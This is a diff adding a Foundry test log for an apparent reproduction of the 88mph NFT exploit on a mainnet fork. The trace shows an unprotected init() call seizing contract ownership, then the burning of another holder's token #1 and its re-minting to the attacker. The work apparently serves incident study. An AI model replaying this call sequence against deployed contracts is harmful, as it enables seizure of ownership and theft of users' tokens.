@@ -1,0 +1,145 @@
+Compiling 21 files with Solc 0.8.10
+Solc 0.8.10 finished in 598.88ms
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1084:5:
+     |
+1084 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1896:5:
+     |
+1896 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2198:5:
+     |
+2198 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2967:5:
+     |
+2967 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:4462:5:
+     |
+4462 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2018): Function state mutability can be restricted to pure
+  --> test/88mph_exp.sol:37:5:
+   |
+37 |     function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for test/88mph_exp.sol:ContractTest
+[PASS] testExploit() (gas: 109781)
+Logs:
+  Before exploiting, NFT contract owner: 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD
+  After exploiting, NFT contract owner: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
+  NFT Owner of #1:  0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0
+  After burning: NFT Owner of #1:  0x0000000000000000000000000000000000000000
+  After exploiting: NFT Owner of #1:  0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
+
+Traces:
+  [5845] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 12516705 [1.251e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [109781] ContractTest::testExploit()
+    ├─ [5070] NFT::owner() [staticcall]
+    │   ├─ [2404] NFT::owner() [delegatecall]
+    │   │   └─ ← [Return] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD
+    │   └─ ← [Return] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD
+    ├─ [0] console::log("Before exploiting, NFT contract owner:", 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [27962] NFT::init(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], "0", "0")
+    │   ├─ [27757] NFT::init(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], "0", "0") [delegatecall]
+    │   │   ├─ emit OwnershipTransferred(previousOwner: 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD, newOwner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─  storage changes:
+    │   │   │   @ 9: 0x000000000000000000000000904f81eff3c35877865810cca9a63f2d9cb7d4dd → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 11: 0x38386d70682079614c494e4b20506f6f6c204465706f73697400000000000032 → 0x3000000000000000000000000000000000000000000000000000000000000002
+    │   │   │   @ 12: 0x38386d70682d79614c494e4b2d4465706f736974000000000000000000000028 → 0x3000000000000000000000000000000000000000000000000000000000000002
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [570] NFT::owner() [staticcall]
+    │   ├─ [404] NFT::owner() [delegatecall]
+    │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    ├─ [0] console::log("After exploiting, NFT contract owner:", ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [2752] NFT::ownerOf(1) [staticcall]
+    │   ├─ [2580] NFT::ownerOf(1) [delegatecall]
+    │   │   └─ ← [Return] 0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0
+    │   └─ ← [Return] 0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0
+    ├─ [0] console::log("NFT Owner of #1: ", 0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [16076] NFT::burn(1)
+    │   ├─ [15907] NFT::burn(1) [delegatecall]
+    │   │   ├─ emit Transfer(from: 0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0, to: 0x0000000000000000000000000000000000000000, tokenId: 1)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xcc69885fda6bcc1a4ace058b4a62bf5e179ea78fd58a1ccd71c22cc9b688792f: 0x000000000000000000000000afd5f60aa8eb4f488eaa0ef98c1c5b0645d9a0a0 → 0
+    │   │   │   @ 0x902e1d43c05fbb96a4bdef0225cfa5d61a298c6c6a57007e0e6d967d126d95a9: 3 → 2
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  )ERC721: owner query for nonexistent token)
+    │   └─ ← [Return]
+    ├─ [822] NFT::ownerOf(1) [staticcall]
+    │   ├─ [630] NFT::ownerOf(1) [delegatecall]
+    │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
+    │   └─ ← [Revert] ERC721: owner query for nonexistent token
+    ├─ [0] console::log("After burning: NFT Owner of #1: ", 0x0000000000000000000000000000000000000000) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [29174] NFT::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
+    │   ├─ [28999] NFT::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1) [delegatecall]
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1)
+    │   │   ├─ [1803] ContractTest::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 1, 0x)
+    │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 1
+    │   │   │   @ 0xcc69885fda6bcc1a4ace058b4a62bf5e179ea78fd58a1ccd71c22cc9b688792f: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [752] NFT::ownerOf(1) [staticcall]
+    │   ├─ [580] NFT::ownerOf(1) [delegatecall]
+    │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    ├─ [0] console::log("After exploiting: NFT Owner of #1: ", ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.18s (3.59s CPU time)
+
+Ran 1 test suite in 6.93s (5.18s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
